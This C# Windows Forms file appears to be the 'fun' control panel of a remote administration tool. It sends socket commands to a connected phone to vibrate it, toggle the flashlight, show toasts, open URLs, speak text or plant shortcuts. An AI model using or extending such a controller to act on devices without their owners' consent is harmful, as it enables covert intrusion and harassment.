using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Eglence : MetroFramework.Forms.MetroForm
    {
        Socket sck; public string ID = "";
        public Eglence(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
            metroTile1.Click += button1_Click;
            metroTile2.Click += button3_Click;
            metroTile3.Click += button2_Click;
            metroTile4.Click += button5_Click;
            metroTile5.Click += button4_Click;
            metroTile6.Click += button6_Click;
            metroTile7.Click += button7_Click;
            metroTile8.Click += button9_Click;
            metroTile9.Click += button8_Click;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("VIBRATION", Encoding.UTF8.GetBytes(((int)numericUpDown1.Value * 1000).ToString()));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("FLASH", Encoding.UTF8.GetBytes("AC"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("FLASH", Encoding.UTF8.GetBytes("KAPA"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("TOST", Encoding.UTF8.GetBytes(textBox1.Text));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("URL", Encoding.UTF8.GetBytes(textBox2.Text));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("ANASAYFA", Encoding.UTF8.GetBytes("ECHO"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("KONUS", Encoding.UTF8.GetBytes(textBox3.Text));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }
        byte[] ico_bytes = default;
        public byte[] ImageToByteArray(Image imageIn)
        {
            using (var ms = new MemoryStream())
            {
                imageIn.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
        }
        private void button9_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            {
                Multiselect = false,
                Filter = "Image files (.jpg .png .jpeg)|*.jpeg;*.png;*.jpg",
                Title = "Select an icon.."
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    pictureBox1.ImageLocation = op.FileName;
                    Image img = ResizeImage(Image.FromFile(op.FileName), 72, 72);
                    ico_bytes = ImageToByteArray(img);
                }
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("SHORTCUT", ico_bytes , textBox4.Text + "[VERI]" + textBox5.Text);
                    sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }          
            }
        }
        public static Bitmap ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);
            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);
            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
                using (var wrapMode = new ImageAttributes())
                {

                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }
            return destImage;
        }

        private void button10_Click(object sender, EventArgs e)
        {
            try
            {
            }
            catch (Exception) { }
        }
    }
}
